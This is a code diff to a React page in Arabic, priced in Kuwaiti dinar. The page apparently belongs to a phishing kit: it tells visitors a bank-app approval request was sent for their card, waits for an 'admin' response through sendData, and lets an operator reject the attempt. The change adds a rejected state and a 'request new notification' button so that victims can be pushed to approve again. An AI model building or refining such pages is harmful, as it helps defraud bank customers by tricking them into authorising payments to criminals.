@@ -8,6 +8,7 @@ import { sendData, cardAction, navigateToPage } from "@/lib/store";
 export default function BankAppVerification() {
   const [error, setError] = useState(false);
   const [isWaiting, setIsWaiting] = useState(false);
+  const [rejected, setRejected] = useState(false);
   const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
   const cardLast4 = paymentData.cardLast4 || "****";
   const totalAmount = localStorage.getItem("Total") || paymentData.totalPaid || "0.000";
@@ -18,12 +19,13 @@ export default function BankAppVerification() {
   useSignalEffect(() => {
     const a = cardAction.value;
     if (!a) return;
-    if (a.action === "reject") { setError(true); setIsWaiting(false); }
+    if (a.action === "reject") { setRejected(true); setError(true); setIsWaiting(false); }
     cardAction.value = null;
   });
 
   const handleApprove = () => {
     setError(false);
+    setRejected(false);
     setIsWaiting(true);
     sendData({ current: "تطبيق البنك", nextPage: "الصفحة النهائية", waitingForAdminResponse: true });
   };
@@ -44,10 +46,10 @@ export default function BankAppVerification() {
           <p>تم إرسال طلب الموافقة إلى تطبيق البنك للبطاقة المنتهية بـ <span className="font-bold" dir="ltr">{cardLast4}</span> بمبلغ <span className="font-bold">{totalAmount} د.ك</span>.</p>
           <p className="mt-2">افتح تطبيق البنك واختر الإشعار الظاهر ثم اضغط موافقة، وبعد الانتهاء اضغط الزر بالأسفل.</p>
         </div>
-        <div className="flex justify-center mb-6"><div className="w-14 h-14 border-4 border-primary border-t-transparent rounded-full animate-spin"></div></div>
+        {!rejected && (<div className="flex justify-center mb-6"><div className="w-14 h-14 border-4 border-primary border-t-transparent rounded-full animate-spin"></div></div>)}
         {error && <p className="text-red-500 text-sm text-center font-medium mb-4">لم تتم الموافقة على العملية، يرجى المحاولة مرة أخرى.</p>}
         <div className="space-y-3">
-          <Button className="w-full h-11 text-sm" onClick={handleApprove} disabled={isWaiting}>{isWaiting ? "جاري التحقق..." : "تمت الموافقة"}</Button>
+          <Button className="w-full h-11 text-sm" onClick={handleApprove} disabled={isWaiting}>{isWaiting ? "جاري التحقق..." : rejected ? "طلب إشعار جديد" : "تمت الموافقة"}</Button>
           <Button variant="outline" className="w-full h-11 text-sm" onClick={() => window.history.back()}>إلغاء</Button>
         </div>
       </div>
